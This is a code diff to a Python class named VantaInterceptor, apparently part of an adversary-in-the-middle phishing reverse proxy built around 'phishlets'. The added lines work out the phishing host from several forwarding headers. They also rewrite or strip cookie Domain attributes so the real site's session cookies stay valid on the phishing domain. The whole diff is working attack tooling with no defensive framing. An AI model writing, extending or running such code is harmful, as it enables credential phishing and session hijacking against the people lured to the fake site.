@@ -202,10 +202,24 @@ class VantaInterceptor:
                 # Apply mapping
                 flow.request.host = target_host
                 try:
-                    # Determine effective phishing host from the ORIGINAL header
                     xfwd = flow.request.headers.get("x-forwarded-host")
+                    xorig = flow.request.headers.get("x-original-host")
+                    fwd = flow.request.headers.get("forwarded")
                     import re as _re_ip
-                    cand = (xfwd or orig_hdr or host).split(",")[0].strip()
+                    cand = None
+                    if xfwd:
+                        cand = xfwd.split(",")[0].strip()
+                    elif xorig:
+                        cand = xorig.split(",")[0].strip()
+                    elif fwd and "host=" in fwd:
+                        try:
+                            m = re.search(r"host=([^;,\s]+)", fwd, re.IGNORECASE)
+                            if m:
+                                cand = m.group(1)
+                        except Exception:
+                            pass
+                    if not cand:
+                        cand = (orig_hdr or host).split(",")[0].strip()
                     if ":" in cand:
                         cand = cand.split(":", 1)[0]
                     if _re_ip.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", cand) or cand in ("localhost",):
@@ -214,6 +228,8 @@ class VantaInterceptor:
                         ph_effective = cand
                     flow.metadata["v_ph_host"] = ph_effective
                     flow.metadata["v_tgt_host"] = target_host
+                    if getattr(self.phishlet, "bridges", []):
+                        flow.metadata["v_single_domain"] = True
                 except Exception:
                     pass
                 self.logger.debug(f"Rewrote host: {host} -> {target_host}")
@@ -243,8 +259,23 @@ class VantaInterceptor:
                     if not hasattr(flow, "metadata"):
                         flow.metadata = {}
                     xfwd = flow.request.headers.get("x-forwarded-host")
+                    xorig = flow.request.headers.get("x-original-host")
+                    fwd = flow.request.headers.get("forwarded")
                     import re as _re_ip2
-                    cand = (xfwd or orig_hdr or host).split(",")[0].strip()
+                    cand = None
+                    if xfwd:
+                        cand = xfwd.split(",")[0].strip()
+                    elif xorig:
+                        cand = xorig.split(",")[0].strip()
+                    elif fwd and "host=" in fwd:
+                        try:
+                            m = re.search(r"host=([^;,\s]+)", fwd, re.IGNORECASE)
+                            if m:
+                                cand = m.group(1)
+                        except Exception:
+                            pass
+                    if not cand:
+                        cand = (orig_hdr or host).split(",")[0].strip()
                     if ":" in cand:
                         cand = cand.split(":", 1)[0]
                     if _re_ip2.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", cand) or cand in ("localhost",):
@@ -253,6 +284,8 @@ class VantaInterceptor:
                         ph_effective = cand
                     flow.metadata["v_ph_host"] = ph_effective
                     flow.metadata["v_tgt_host"] = first_target
+                    if getattr(self.phishlet, "bridges", []):
+                        flow.metadata["v_single_domain"] = True
                     self.logger.debug(f"Fallback host map: {host} -> {first_target}")
             except Exception:
                 pass
@@ -385,21 +418,17 @@ class VantaInterceptor:
             ph_host = getattr(flow, "metadata", {}).get("v_ph_host")
             tgt_host = getattr(flow, "metadata", {}).get("v_tgt_host")
             is_bridge = getattr(flow, "metadata", {}).get("v_bridge", False)
+            single_domain = getattr(flow, "metadata", {}).get("v_single_domain", False)
 
             if ph_host:
                 for name, (value, attrs) in list(flow.response.cookies.items()):
                     dom = attrs.get("domain")
-                    
-                    # If we are using bridges (single domain mode), strip domain to make it host-only
-                    if is_bridge:
+                    if single_domain or is_bridge:
                         if "domain" in attrs:
                             del attrs["domain"]
-                        # Also fix SameSite/Secure if needed for non-secure contexts (though localhost.run is https)
                         if "samesite" in attrs and attrs["samesite"].lower() == "none":
                             attrs["secure"] = True # Must be secure for None
                         flow.response.cookies[name] = (value, attrs)
-                    
-                    # Normal subdomain mode
                     elif tgt_host and dom and (dom == tgt_host or dom.endswith("." + tgt_host)):
                         attrs["domain"] = ph_host
                         flow.response.cookies[name] = (value, attrs)
